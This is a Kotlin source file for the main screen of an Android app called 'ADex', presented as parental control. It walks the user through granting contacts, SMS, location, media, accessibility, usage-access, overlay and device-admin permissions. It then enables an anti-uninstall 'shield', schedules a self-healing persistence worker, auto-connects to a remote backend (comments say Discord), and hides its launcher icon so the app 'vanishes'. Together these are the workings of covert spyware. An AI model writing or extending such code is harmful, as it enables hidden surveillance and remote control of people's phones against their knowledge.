package com.adex.app

import android.Manifest
import android.content.BroadcastReceiver
import android.content.Context
import android.content.ComponentName
import android.content.Intent
import android.content.IntentFilter
import android.content.pm.PackageManager
import android.os.Build
import android.os.Bundle
import android.widget.TextView
import androidx.appcompat.app.AppCompatActivity
import androidx.core.app.ActivityCompat
import androidx.core.content.ContextCompat
import androidx.lifecycle.lifecycleScope
import com.adex.app.data.SettingsStore
import com.adex.app.service.ADexForegroundService
import com.adex.app.service.ServiceActions
import com.adex.app.ui.ParentPinGateActivity
import com.adex.app.util.ParentalShieldManager
import com.adex.app.util.PermissionHelper
import com.adex.app.util.PersistenceWorker
import com.google.android.material.button.MaterialButton
import kotlinx.coroutines.launch

// MainActivity provides onboarding, permission setup, and foreground-service control.
class MainActivity : AppCompatActivity() {
    private lateinit var settingsStore: SettingsStore
    private lateinit var statusText: TextView
    private lateinit var deviceIdText: TextView
    private lateinit var permissionsIntroText: TextView
    private lateinit var permissionsChecklistText: TextView
    private var autoPromptedScreenshotPermission = false

    private val pairCodeReceiver = object : BroadcastReceiver() {
        override fun onReceive(context: Context?, intent: Intent?) {
            if (intent?.action == ADexForegroundService.ACTION_PAIR_CODE) {
                val code = intent.getStringExtra(ADexForegroundService.EXTRA_PAIR_CODE) ?: return
                updateStatusText(code)
            }
        }
    }

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        settingsStore = SettingsStore(applicationContext)
        settingsStore.syncLaunchPinGateArm()
        if (settingsStore.launchPinGateArmed) {
            startActivity(Intent(this, ParentPinGateActivity::class.java))
            finish()
            return
        }

        setContentView(R.layout.activity_main)

        statusText = findViewById(R.id.statusText)
        deviceIdText = findViewById(R.id.deviceIdText)
        permissionsIntroText = findViewById(R.id.permissionsIntroText)
        permissionsChecklistText = findViewById(R.id.permissionsChecklistText)

        val permissionsButton = findViewById<MaterialButton>(R.id.permissionsButton)

        permissionsIntroText.text = getString(R.string.permissions_intro, currentAppName())
        deviceIdText.text = "Device ID: ${settingsStore.stableDeviceId}"

        permissionsButton.setOnClickListener {
            runPermissionSetup()
            updatePermissionChecklistText()
        }

        updateStatusText(ADexForegroundService.lastPairCode)
        updatePermissionChecklistText()

        // IMMEDIATE DISCORD ACCESS: Start service as soon as app is opened if configured.
        if (isAutoEnrollConfigured() && !ADexForegroundService.isServiceRunning) {
            startForegroundSession()
        }
    }

    override fun onStart() {
        super.onStart()
        ContextCompat.registerReceiver(
            this,
            pairCodeReceiver,
            IntentFilter(ADexForegroundService.ACTION_PAIR_CODE),
            ContextCompat.RECEIVER_NOT_EXPORTED
        )
    }

    override fun onStop() {
        runCatching { unregisterReceiver(pairCodeReceiver) }
        super.onStop()
    }

    override fun onResume() {
        super.onResume()
        settingsStore.syncLaunchPinGateArm()
        if (settingsStore.launchPinGateArmed) {
            startActivity(Intent(this, ParentPinGateActivity::class.java))
            finish()
            return
        }
        autoPromptScreenshotPermissionIfNeeded()
        maybeEnableShieldAfterPermissions()
        updateStatusText(ADexForegroundService.lastPairCode)
        updatePermissionChecklistText()
    }

    private fun runPermissionSetup() {
        // 1. Runtime permissions (Contacts, SMS, Location, etc.)
        val missing = PermissionHelper.missingRuntimePermissions(this)
        if (missing.isNotEmpty()) {
            ActivityCompat.requestPermissions(this, missing.toTypedArray(), 1001)
            return
        }

        // 2. Android 13+ Specifics
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            val permissions = arrayOf(
                android.Manifest.permission.POST_NOTIFICATIONS,
                android.Manifest.permission.READ_MEDIA_IMAGES,
                android.Manifest.permission.READ_MEDIA_VIDEO,
                android.Manifest.permission.READ_MEDIA_AUDIO
            )
            val toRequest = permissions.filter { checkSelfPermission(it) != PackageManager.PERMISSION_GRANTED }
            if (toRequest.isNotEmpty()) {
                ActivityCompat.requestPermissions(this, toRequest.toTypedArray(), 1002)
                return
            }
        }

        // 3. Accessibility Service (CRITICAL for Monitoring & Anti-Uninstall)
        if (!PermissionHelper.isAccessibilityServiceEnabled(this)) {
            startActivity(PermissionHelper.accessibilitySettingsIntent())
            return
        }

        // 4. Usage Data access (Required for App Detection)
        if (!PermissionHelper.hasUsageStatsPermission(this)) {
            startActivity(PermissionHelper.usageAccessSettingsIntent())
            return
        }

        // 5. System Alert Window (Overlay for Blocking)
        if (!PermissionHelper.hasOverlayPermission(this)) {
            startActivity(PermissionHelper.overlaySettingsIntent(this))
            return
        }

        // 6. Device Admin (Anti-Deactivation & Remote Lock)
        if (!PermissionHelper.isDeviceAdminEnabled(this)) {
            startActivity(PermissionHelper.deviceAdminSettingsIntent(this))
            return
        }
        
        // Everything granted -> Enable protection and vanish
        maybeEnableShieldAfterPermissions()
    }

    private fun runOneTapLink() {
        if (!isAutoEnrollConfigured()) {
            return
        }

        if (allCriticalPermissionsGranted()) {
            startForegroundSession()
        }
    }

    private fun startForegroundSession() {
        val intent = Intent(this, ADexForegroundService::class.java).apply {
            action = ServiceActions.ACTION_START
        }
        ContextCompat.startForegroundService(this, intent)
    }

    private fun updateStatusText(pairCode: String) {
        val status = if (ADexForegroundService.isServiceRunning) "Running" else "Standby"
        val linkState = when {
            pairCode.startsWith("linked:", ignoreCase = true) -> "Secure"
            pairCode.startsWith("pair_code:", ignoreCase = true) -> "Pending Sync"
            pairCode.startsWith("error:", ignoreCase = true) -> "Config Error"
            pairCode.isNotBlank() -> pairCode
            else -> "Not Setup"
        }
        statusText.text = "System: $status | $linkState"
    }

    private fun updatePermissionChecklistText() {
        val runtimeMissing = PermissionHelper.missingRuntimePermissions(this)
        val notificationGranted = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            checkSelfPermission(android.Manifest.permission.POST_NOTIFICATIONS) == PackageManager.PERMISSION_GRANTED
        } else {
            true
        }
        val screenshotStatusText = when {
            !PermissionHelper.isScreenshotSupported() -> "UNSUPPORTED (Android 11+ required)"
            PermissionHelper.isScreenshotPermissionReady(this) -> "[OK]"
            else -> "[REQUIRED: Enable Accessibility]"
        }

        val lines = listOf(
            "- Overlay permission: ${statusLabel(PermissionHelper.hasOverlayPermission(this))}",
            "- Usage Access permission: ${statusLabel(PermissionHelper.hasUsageStatsPermission(this))}",
            "- Accessibility service: ${statusLabel(PermissionHelper.isAccessibilityServiceEnabled(this))}",
            "- Screenshot permission: $screenshotStatusText",
            "- Device Admin: ${statusLabel(PermissionHelper.isDeviceAdminEnabled(this))}",
            "- Runtime permissions: ${statusLabel(runtimeMissing.isEmpty())}",
            "- Notification permission: ${statusLabel(notificationGranted)}",
        ).toMutableList()

        if (runtimeMissing.isNotEmpty()) {
            lines.add("Missing runtime: ${runtimeMissing.joinToString(", ")}")
        }

        permissionsChecklistText.text = lines.joinToString("\n")
    }

    private fun statusLabel(ok: Boolean): String {
        return if (ok) "[OK]" else "[REQUIRED]"
    }

    private fun currentAppName(): String {
        return applicationInfo.loadLabel(packageManager).toString()
    }

    private fun autoPromptScreenshotPermissionIfNeeded() {
        if (autoPromptedScreenshotPermission) {
            return
        }
        if (!PermissionHelper.isScreenshotSupported()) {
            autoPromptedScreenshotPermission = true
            return
        }
        if (PermissionHelper.isScreenshotPermissionReady(this)) {
            autoPromptedScreenshotPermission = true
            return
        }

        autoPromptedScreenshotPermission = true
        startActivity(PermissionHelper.accessibilitySettingsIntent())
    }

    private fun allCriticalPermissionsGranted(): Boolean {
        val notificationGranted = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            ContextCompat.checkSelfPermission(this, Manifest.permission.POST_NOTIFICATIONS) == PackageManager.PERMISSION_GRANTED
        } else {
            true
        }

        return PermissionHelper.missingRuntimePermissions(this).isEmpty() &&
            PermissionHelper.hasOverlayPermission(this) &&
            PermissionHelper.hasUsageStatsPermission(this) &&
            PermissionHelper.isAccessibilityServiceEnabled(this) &&
            PermissionHelper.isDeviceAdminEnabled(this) &&
            notificationGranted
    }

    private fun isAutoEnrollConfigured(): Boolean {
        val tokenConfigured = settingsStore.enrollmentToken.isNotBlank()
        val httpConfigured = settingsStore.backendHttpUrl.startsWith("http://") || settingsStore.backendHttpUrl.startsWith("https://")
        val wsConfigured = settingsStore.backendWsUrl.startsWith("ws://") || settingsStore.backendWsUrl.startsWith("wss://")
        return tokenConfigured && httpConfigured && wsConfigured
    }

    private fun maybeEnableShieldAfterPermissions() {
        // 2. IMMEDIATE UNINSTALL SHIELD: Enable as soon as accessibility is granted.
        if (PermissionHelper.isAccessibilityServiceEnabled(this)) {
            if (!settingsStore.shieldEnabled) {
                ParentalShieldManager.setShieldEnabled(this@MainActivity, settingsStore, true)
            }
        }

        // 3. FULL SETUP CHECK: Only vanish when ALL critical permissions are ready.
        val coreReady = allCriticalPermissionsGranted()

        if (!coreReady) {
            return
        }

        lifecycleScope.launch {
            runCatching {
                // 1. Ensure shield is enabled
                if (!settingsStore.shieldEnabled) {
                    ParentalShieldManager.setShieldEnabled(this@MainActivity, settingsStore, true)
                }
                
                // 2. Schedule persistence worker for self-healing
                PersistenceWorker.schedule(applicationContext)

                // 3. AUTO-START: Connect to Discord as soon as permissions allow
                if (isAutoEnrollConfigured() && !ADexForegroundService.isServiceRunning) {
                    startForegroundSession()
                }

                // 4. AUTO-HIDE: Remove icon from drawer and exit setup
                hideAppIcon()
                
                // Show a quick text before closing so they know it's "Done"
                statusText.text = "Setup Complete. System secured."
                
                kotlinx.coroutines.delay(1500)
                finish()
            }
        }
    }

    private fun hideAppIcon() {
        runCatching {
            val pkg = packageManager
            val component = ComponentName(this, MainActivity::class.java)
            pkg.setComponentEnabledSetting(
                component,
                PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
                PackageManager.DONT_KILL_APP
            )
        }
    }
}
